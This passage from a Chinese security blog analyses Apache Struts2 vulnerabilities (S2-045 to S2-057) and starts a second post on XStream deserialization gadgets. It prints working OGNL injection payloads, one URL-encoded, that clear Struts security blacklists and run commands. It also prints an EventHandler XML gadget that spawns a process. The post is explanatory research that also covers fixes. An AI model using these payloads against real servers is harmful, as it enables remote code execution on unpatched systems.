class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class="line">(#_memberAccess?(#_memberAccess=#dm):</span><br><span class="line">(</span><br><span class="line">(#container=#context['com.opensymphony.xwork2.ActionContext.container']).</span><br><span class="line">(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class="line">(#ognlUtil.getExcludedPackageNames().clear()).</span><br><span class="line">(#ognlUtil.getExcludedClasses().clear()).</span><br><span class="line">(#context.setMemberAccess(#dm)))).</span><br><span class="line">(#cmd='id').</span><br><span class="line">(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).</span><br><span class="line">(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).</span><br><span class="line">(#p=new java.lang.ProcessBuilder(#cmds)).</span><br><span class="line">(#p.redirectErrorStream(true)).</span><br><span class="line">(#process=#p.start()).</span><br><span class="line">(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class="line">(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).</span><br><span class="line">(#ros.flush())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要看5-10行，一开始的思路是直接用赋值的方式来覆盖存在限制的SecurityMemberAccess，但是现在有了<code>excludedClasses</code>的限制不能直接用这种方式来达成（具体看<code>SecurityMemberAccess.isAccessible</code>）。</p><p>那么就看看能不能用setters去设置<code>SecurityMemberAccess</code></p><p>这里就看<code>ognl.OgnlContext#setMemberAccess</code>，而这个context就是我们在OGNL表达式里用<code>#context</code>表示的</p><p>那么直接用<code>#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code>就可以覆盖原有的MemberAccess，但是因为<code>#context</code>本身就是被禁止的类，我们不能直接调用他。</p><p>我们需要首先去除掉<code>ExcludedPackageNames</code>和<code>ExcludedClasses</code></p><p>来看看他是怎么设置的<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil</code></p><p><img src="/images/talk_about_struts2/image-20200521172344561.png" alt="image-20200521172344561"></p><p>可以看到<code>securityMemberAccess</code>的相关禁用设置都是来自于<code>ognlUtil</code>，这意味着我们只需要清除掉<code>ognlUtil</code>的禁用设置就可以消除掉<code>securityMemberAccess</code>的限制。这是因为在jvm里面他们用的都是同一个实例。</p><p>所以上面的POC中用struts2的container的方式去获取ognlUtil实例，并将其禁用设置全部清除掉</p><p>那么后面再用<code>#context.setMemberAccess</code>就没有阻碍了</p><p>后续的代码就是执行并回显了，跟前面的类似</p><h3 id="修复-9"><a href="#修复-9" class="headerlink" title="修复"></a>修复</h3><p><img src="/images/talk_about_struts2/image-20200521204140738.png" alt="image-20200521204140738"></p><p>修复主要是不把message传入，放到了args的位置</p><h2 id="15-S2-048"><a href="#15-S2-048" class="headerlink" title="15. S2-048"></a>15. S2-048</h2><p>这一部分不仔细说了，看<a href="https://www.freebuf.com/vuls/217482.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217482.html</a></p><h2 id="16-S2-052"><a href="#16-S2-052" class="headerlink" title="16. S2-052"></a>16. S2-052</h2><p>影响范围:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p><blockquote><p>The REST Plugin is using a <code>XStreamHandler</code> with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.</p></blockquote><p>struts2的rest插件注册了ContentTypeInterceptor来处理不同的content-type</p><p><img src="/images/talk_about_struts2/image-20200522100814912.png" alt="image-20200522100814912"></p><p>针对xml类型，将调用<code>XStreamHandler</code>来处理</p><p><code>org.apache.struts2.rest.ContentTypeInterceptor#intercept</code></p><p><img src="/images/talk_about_struts2/image-20200522101114659.png" alt="image-20200522101114659"></p><p>根据request请求选择handler，这里我们传入<code>application/xml</code>类型，将使用<code>org.apache.struts2.rest.handler.XStreamHandler#toObject</code>来处理xml</p><p><img src="/images/talk_about_struts2/image-20200522101244620.png" alt="image-20200522101244620"></p><p>这里用了最简单的调用方式（1.4.8版本），没有做xstream的相关安全处理，导致XStream反序列化</p><p>所以我们传入构造好的XML就可以达到命令执行</p><h3 id="POC-11"><a href="#POC-11" class="headerlink" title="POC"></a>POC</h3><p>这里的xml可以用我的ysomap去生成，把Content-Type设置成<code>application/xml</code>就可以了</p><h3 id="修复-10"><a href="#修复-10" class="headerlink" title="修复"></a>修复</h3><p>S2-052跟以往的漏洞不一样，这里跟OGNL表达式并没有什么关系了，修复也比较简单</p><p>升级XStream到了1.4.10版本，并且添加了安全措施</p><p><img src="/images/talk_about_struts2/image-20200522102217477.png" alt="image-20200522102217477"></p><p>这里新添加了<code>AllowedClasses</code>、<code>AllowedClassNames</code>、<code>XStreamPermissionProvider</code>来设置每个类可以反序列化的对象列表</p><p>也会添加一些默认的类</p><p><img src="/images/talk_about_struts2/image-20200522102927472.png" alt="image-20200522102927472"></p><p>这里的用法就是XStream官方推荐的，采用白名单的方式来防止不安全的反序列化</p><h2 id="17-S2-053"><a href="#17-S2-053" class="headerlink" title="17. S2-053"></a>17. S2-053</h2><p>影响版本:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1</p><p>S2-053问题出在freemarker的标签内容可控时出现的问题</p><p><img src="/images/talk_about_struts2/image-20200522103937515.png" alt="image-20200522103937515"></p><p>在action执行结束后，由于设置的类型为freemarker，所以结果交由freemarker来处理</p><p><img src="/images/talk_about_struts2/image-20200522111039529.png" alt="image-20200522111039529"></p><p>关注对freemarker标签解析的类<code>org.apache.struts2.views.freemarker.tags.CallbackWriter#onStart</code></p><p><img src="/images/talk_about_struts2/image-20200522111238176.png" alt="image-20200522111238176"></p><p>因为这里我们时url标签，所以由<code>org.apache.struts2.components.URL#start</code>来处理</p><p><img src="/images/talk_about_struts2/image-20200522111315111.png" alt="image-20200522111315111"></p><p>回到了由<code>ServletUrlRenderer</code>来解析我们传入的OGNL表达式，跟S2-013一样，后续也是由<code>TextParseUtil.translateVariables</code>触发的</p><h3 id="POC-12"><a href="#POC-12" class="headerlink" title="POC"></a>POC</h3><p>poc可以直接用S2-045的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line"><span class="comment">// 记得编码</span></span><br></pre></td></tr></table></figure><h3 id="修复-11"><a href="#修复-11" class="headerlink" title="修复"></a>修复</h3><blockquote><p>这次的修复是在FreemarkerManager中多了两行代码，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;  LOG.debug(&quot;Sets NewBuiltinClassResolver to TemplateClassResolver.SAFER_RESOLVER&quot;, new String[0]);</span><br><span class="line">&gt; configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>去看了一下TemplateClassResolver.SAFER_RESOLVER)的官方文档，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; TemplateClassResolver.SAFER_RESOLVER now disallows creating freemarker.template.utility.JythonRuntime and freemarker.template.utility.Execute. This change affects the behavior of the new built-in if FreeMarker was configured to use SAFER_RESOLVER, which is not the default until 2.4 and is hence improbable.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>大致意思应该就是禁止了freemarker的RCE，具体我对freemarker不太了解，就不去误人子弟了。</p></blockquote><p>修复直接参考<a href="https://www.freebuf.com/vuls/217482.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217482.html</a></p><h2 id="18-S2-055"><a href="#18-S2-055" class="headerlink" title="18. S2-055"></a>18. S2-055</h2><p>影响范围：Struts 2.5 - Struts 2.5.14</p><p>S2-055漏洞原理跟S2-052一样，由jackson库处理json内容时产生的漏洞，这里默认不是用jackson处理json内容的，得在struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">type</span>=<span class="string">"org.apache.struts2.rest.handler.ContentTypeHandler"</span> <span class="attr">name</span>=<span class="string">"jackson"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.rest.handler.JacksonLibHandler"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.rest.handlerOverride.json"</span> <span class="attr">value</span>=<span class="string">"jackson"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>这里本身是因为jackson反序列化问题产生的，后面抽空分析一下这个jackson，这里不继续分析了</p><p>因为需要配置才可以打，所以这里的危害并没有想xstream一样严重</p><p>具体分析见<a href="http://xxlegend.com/2017/12/06/S2-055漏洞环境搭建与分析/" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/</a></p><h2 id="19-S2-057"><a href="#19-S2-057" class="headerlink" title="19. S2-057"></a>19. S2-057</h2><p>影响范围：Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16</p><blockquote><p>北京时间8月22日13时，Apache官方发布通告公布了Struts2中一个远程代码执行漏洞（CVE-2018-11776）。该漏洞在两种情况下存在，第一，在xml配置中未设置namespace值，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。第二，使用未设置 value和action值的url标签，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。</p><p><a href="https://paper.seebug.org/682/" target="_blank" rel="noopener">https://paper.seebug.org/682/</a></p></blockquote><p>这里一种配置方案是</p><p><img src="/images/talk_about_struts2/image-20200522152919691.png" alt="image-20200522152919691"></p><p>没有配置namespace，访问s2057.action都会导向test.action，这里处理redirectAction的是</p><p><img src="/images/talk_about_struts2/image-20200522153229727.png" alt="image-20200522153229727"></p><p><code>org.apache.struts2.dispatcher.ServletActionRedirectResult#execute</code></p><p><img src="/images/talk_about_struts2/image-20200522153556365.png" alt="image-20200522153556365"></p><p><code>ServletActionRedirectResult</code>会将namespace一起拼接进location，比如<code>/s2vuls/${1*2}/s2057.action</code>,其namespace为<code>/${1*2}</code>,actionName为跳转的test，最终location为<code>/${1*2}/test.action</code>。到这里我们就引入了OGNL表达式，看后续的一个处理</p><p><code>org.apache.struts2.dispatcher.StrutsResultSupport#execute</code></p><p><img src="/images/talk_about_struts2/image-20200522154209594.png" alt="image-20200522154209594"></p><p>到这里，就开始熟悉起来了，就是S2-012的漏洞触发点</p><p><img src="/images/talk_about_struts2/image-20200522154315511.png" alt="image-20200522154315511"></p><p>传入了<code>TextParseUtil.translateVariables</code>，到这里就结束了，后续将调用OGNL.getValue</p><h3 id="POC-13"><a href="#POC-13" class="headerlink" title="POC"></a>POC</h3><p>在2.3.x版本，可以直接用S2-045的poc打</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action</span><br></pre></td></tr></table></figure><p>而对于2.5.x版本，我们需要好好分析一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#ct=#request['struts.valueStack'].context).</span><br><span class="line">(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).</span><br><span class="line">(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class="line">(#ou.setExcludedClasses('')).</span><br><span class="line">(#ou.setExcludedPackageNames('')).</span><br><span class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class="line">(#ct.setMemberAccess(#dm)).(#cmd='whoami').</span><br><span class="line">(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).</span><br><span class="line">(#cmds=(#iswin?&#123;'cmd','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).</span><br><span class="line">(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).</span><br><span class="line">(#process=#p.start()).</span><br><span class="line">(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class="line">(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从poc来看，从第7行开始都是我们熟悉的操作，那么前面多了那么多是在做什么？</p><p>参考：<a href="https://paper.seebug.org/794/#35-struts-2516" target="_blank" rel="noopener">https://paper.seebug.org/794/#35-struts-2516</a></p><p>在struts2 2.5.13版本之后，ognl库进行了更新，从3.1.12-&gt;3.1.15，其主要的一个变化是禁止访问<code>context.map</code>，OgnlContext的get、put、remove函数中都删除了对当前context的操作</p><p>此外，excluded相关的集合被设置为不可变，无法通过clear的方式来清除</p><p>针对上面两种的绕过</p><blockquote><p>文章提出了这么一种思路:</p><ul><li>没有办法使用<code>context.map</code>，可以调用<code>attr</code>，前文说过<code>attr</code>中保存着整个<code>context</code>的变量与方法，可以通过<code>attr</code>中的方法返回给我们一个<code>context.map</code>。</li><li>没有办法直接调用<code>excludedClasses</code>，也就不能使用<code>clear</code>方法来清空，但是还可以利用<code>setter</code>来把<code>excludedClasses</code>给设置成空</li><li>清空了黑名单，我们就可以利用<code>DefaultMemberAccess</code>来覆盖<code>_memberAccess</code>，来执行静态方法了。</li></ul><p>而这里又会出现一个问题，当我们使用<code>OgnlUtil</code>的<code>setExcludedClasses</code>和<code>setExcludedPackageNames</code>将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说<code>_memberAccess</code>是源数据的一个引用，就像前文所说的，在每次<code>createAction</code>时都是通过<code>setOgnlUtil</code>利用全局的源数据创建一个引用，这个引用就是一个<code>MemberAccess</code>对象，也就是<code>_memberAccess</code>。所以这里只会影响这次请求的<code>OgnlUtil</code>而并未重新创建一个新的<code>_memberAccess</code>对象，所以旧的<code>_memberAccess</code>对象仍未改变。</p><p>而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的<code>OgnlUitl</code>作为源重新创建一个<code>_memberAccess</code>，这样在第二次请求中<code>_memberAccess</code>就是黑名单被置空的情况，这个时候就释放了<code>DefaultMemberAccess</code>，就可以进行正常的覆盖以及执行静态方法。</p></blockquote><p>看过上面的分析后再来看poc，第二行获取了context，第3 4 5 6行清除了excluded相关的集合，但其当前的请求黑名单还是存在的，所以在2.5.x版本我们需要发送两次这个poc，第一次清楚黑名单，第二次覆盖<code>_memberAccess</code>并调用静态函数</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><hr><p>在分析过程中，参考了很多师傅们的笔记，这里特别感谢一下XD</p><p>从整个s2漏洞的历程来看，能看到很多漏洞其实利用点是相似的，只是说从哪个入口进去可能有所不同。这种漏洞的分析我认为用数据流分析是非常合适的。lgtm的师傅就用了他们的codeql发现了S2-057这个漏洞。</p><p>但是官方在一次次修复中，对于ognl表达式的执行限制的越来越多，使得如今就算出现ognl表达式注入也很难造成RCE的效果。</p><p>这里我们可以直接看<a href="https://paper.seebug.org/users/author/?nickname=lucifaer" target="_blank" rel="noopener">lucifaer</a>师傅的那篇文章</p><p>从时间线来看，</p><ol><li>struts2 2.3.14.1之前，ognl表达式执行没有什么障碍；2.3.14.1增加了<code>SecurityMemberAccess</code>，禁止静态函数执行<code>allowStaticMethodAccess=false</code>，在ognl表达式里面可以重新置为true；后续这个值被改成了final，无法被更改</li><li>struts2 2.3.20之前，虽然不能改<code>allowStaticMethodAccess</code>，但是可以通过构造函数的方式绕过；2.3.20之后，增加了黑名单</li><li>struts2 2.3.29之前，通过<a href="mailto:`#_memberAccess=@ognl.OgnlContext" target="_blank" rel="noopener">`#_memberAccess=@ognl.OgnlContext</a>@DEFAULT_MEMBER_ACCESS`这种方式初始化，清空黑名单；2.3.29之后，新增了黑名单，限制了这种方式的执行</li><li>struts2 2.3.34/2.5.16之前，通过container实例化<code>ognlUtil</code>，清空黑名单，详细见S2-045；之后禁止了context.map的访问和excludedClasses不可变，不能通过clear清楚</li><li>struts2 2.5.17之前，通过request中获取context，绕过context.map禁止访问的限制，详细见S2-057；之后新增了黑名单，完全禁止通过ognl的包来对stack做操作</li><li>后续几个版本也更新了很多安全措施，具体见lucifaer师傅的文章</li></ol><p>在分析完struts2之后，也改变了对很有名的漏洞的感官，以前总觉得struts漏洞都是比较复杂的，但是现在想想有精彩复杂的地方也会有很傻的地方。</p><p>不能对还没有分析过的框架或者应用持有畏惧之心，共勉XD</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回顾XStream反序列化漏洞</title>
      <link href="2020/04/18/java/talk-about-xstream-deserialization/"/>
      <url>2020/04/18/java/talk-about-xstream-deserialization/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><hr><p><a href="https://x-stream.github.io/" target="_blank" rel="noopener">XStream</a>也是一款用的比较多的序列化组件，可以将object转化为XML并能完整的还原回来。他也曾经出现过反序列化漏洞，本文主要整理XStream相关的安全问题XD</p><a id="more"></a><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h1><hr><p>XStream的序列化和反序列化主要依靠<code>toXML</code>函数和<code>fromXML</code>函数，如下代码所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"tom"</span>, <span class="number">18</span>);</span><br><span class="line">XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">String xml = xStream.toXML(person);<span class="comment">// object to xml</span></span><br><span class="line">System.out.println(xml);</span><br><span class="line">System.out.println(xStream.fromXML(xml)); <span class="comment">// xml to object</span></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// &lt;objects.Person&gt;</span></span><br><span class="line"><span class="comment">//   &lt;name&gt;tom&lt;/name&gt;</span></span><br><span class="line"><span class="comment">//   &lt;age&gt;18&lt;/age&gt;</span></span><br><span class="line"><span class="comment">// &lt;/objects.Person&gt;</span></span><br><span class="line"><span class="comment">// objects.Person@369f73a2</span></span><br></pre></td></tr></table></figure><p>关于XStream的fromXML分析看<a href="https://www.jianshu.com/p/387c568faf62" target="_blank" rel="noopener">这篇文章</a>，XStream会去调用不同的Converters来处理还原的过程。</p><p>XStream反序列化同fastjson这种不一样的地方是fastjson会在反序列化的时候主动去调用getters和setters，而XStream的反序列化过程中赋值都有Java的反射机制来完成，所以并没有这样主动调用的特性。</p><p>但是还有一种利用方式，回想一下，在几条常规的java反序列化利用链上，都利用了<code>HashMap</code>、<code>PriorityQueue</code>等对象（key不可重复等特性）会自动去调用<code>hashCode</code>、<code>equal</code>、<code>compareTo</code>等这种函数。</p><p>以这种想法来看XStream反序列化，当我们对Map这种类型的对象进行还原的时候，是否也同样会去调用上面提到的几种函数？接下来，看几个Converter的处理：</p><h2 id="1-MapConverter"><a href="#1-MapConverter" class="headerlink" title="1. MapConverter"></a>1. MapConverter</h2><p>来看看针对Map类型还原的Converter</p><p><code>com.thoughtworks.xstream.converters.collections.MapConverter#unmarshal</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200414231833562.png" alt="image-20200414231833562"></p><p><code>populateMap</code>函数会去处理后续的值，这里我们直接来看具体put的地方</p><p><code>com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200414231951807.png" alt="image-20200414231951807"></p><p>这里target作为接收者，会调用Map的put函数，后续就是我们熟悉的对key调用hashCode函数</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200414232218889.png" alt="image-20200414232218889"></p><h2 id="2-TreeSet-TreeMapConverter"><a href="#2-TreeSet-TreeMapConverter" class="headerlink" title="2. TreeSet/TreeMapConverter"></a>2. TreeSet/TreeMapConverter</h2><p>这里TreeSet和TreeMap一起讲，因为TreeSet本身就是一个只用上了Key的TreeMap；TreeSetConverter的反序列化处理也是先转化为TreeMapConverter的方式来优先还原TreeSet里的TreeMap，再填充到TreeSet里。</p><p>从TreeSetConverter来讲</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415142144637.png" alt="image-20200415142144637"></p><p>从treeset中取出field treemap后，去进一步调用TreeMapConverter来还原TreeMap</p><p><code>com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415142431953.png" alt="image-20200415142431953"></p><p>这里先用soredMap来填充需要还原的Entry，后续将调用<code>TreeMap.putAll</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415142913714.png" alt="image-20200415142913714"></p><p>最终会调用到<code>java.util.AbstractMap#putAll</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415143058176.png" alt="image-20200415143058176"></p><p>这里的put函数为<code>TreeMap.put</code>,不看具体的代码了，他的主要功能就是填充数据，并且在填充时将会比较当前存在key，如果是相同的key，则替换原有老的值。这个过程会去调用key的<code>compareTo</code>函数</p><h2 id="3-DynamicProxyConverter"><a href="#3-DynamicProxyConverter" class="headerlink" title="3. DynamicProxyConverter"></a>3. DynamicProxyConverter</h2><p>还需要提及的是XStream还支持对动态代理的方式进行还原</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415162242443.png" alt="image-20200415162242443"></p><p>这里的还原过程不说了，我们主要的关注点是使用Proxy动态代理，我们可以扩展前面两种的自动调用函数的攻击面，下一章会举<code>EventHandler</code>的例子</p><h1 id="0x02-现有几种利用分析"><a href="#0x02-现有几种利用分析" class="headerlink" title="0x02 现有几种利用分析"></a>0x02 现有几种利用分析</h1><p>结合上面基础知识中提到的几个Converter，我们想要利用XStream反序列化漏洞的话，得去充分利用前面提到的几个会自动调用的函数</p><h2 id="1-EventHandler"><a href="#1-EventHandler" class="headerlink" title="1. EventHandler"></a>1. EventHandler</h2><p>XStream反序列化用的最多的<code>EventHandler</code>，来看看他的<code>invoke</code>函数</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415162715854.png" alt="image-20200415162715854"></p><p>主要实现在<code>invokeInternal</code>函数内</p><p>首先需要判断此时调用的函数是否为<code>hashCode</code>、<code>equals</code>、<code>toString</code>，如果是的话，采用以下的方式来处理。</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415163231155.png" alt="image-20200415163231155"></p><p>但是我们需要利用的是<code>invokeInternal</code>函数后续的部分，所以我们利用的时候不能用它来调用上面的3个函数，<strong>意味着我前面提到的<code>Map</code>的方式，不适合用在这个地方</strong>；而<code>TreeSet</code>这种调用<code>compareTo</code>函数，可以用来继续往下走。</p><p>继续往下看</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200415170159510.png" alt="image-20200415170159510"></p><p>后续的就是经典的java反射机制来实现函数调用，并且这里的target和action都是可控的。</p><p>这里需要注意一个问题是，这里action函数参数是有要求的（看452行到461行）</p><ol><li>无参数</li><li>单个参数，且参数的类型为<code>Comparable</code>，并且这个action函数是可利用的</li></ol><p>第2种还没有找到这样可利用的函数，这里的第一种可以提两种：</p><ul><li>配置好cmd的<code>ProcessBuilder</code>，action填<code>start</code></li><li>配置好rmi url的<code>JdbcRowSetImpl</code>，action填<code>getDatabaseMetaData</code>，这里可以举一反三，主要思路就是可利用的getters</li></ul><p>现在再来看看具体的<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/payload/xstream/EventHandler.java" target="_blank" rel="noopener">POC</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span> <span class="comment">&lt;!-- Proxy 动态代理，handler使用EventHandler --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>/System/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-Groovy-ConvertedClosure"><a href="#2-Groovy-ConvertedClosure" class="headerlink" title="2. Groovy ConvertedClosure"></a>2. Groovy ConvertedClosure</h2><p><strong>利用条件</strong>：groovy &lt;= 2.4.3，在后续的版本里，<code>MethodClosure</code>不允许反序列化调用。</p><p>除了上面这种<code>EventHandler</code>的动态代理方式，Groovy的<code>ConvertedClosure</code>也同样可以达到这种效果</p><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><p>当前MethodClosure的主要作用就是封装我们需要执行的对象，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> MethodClosure(Runtime.getRuntime(), <span 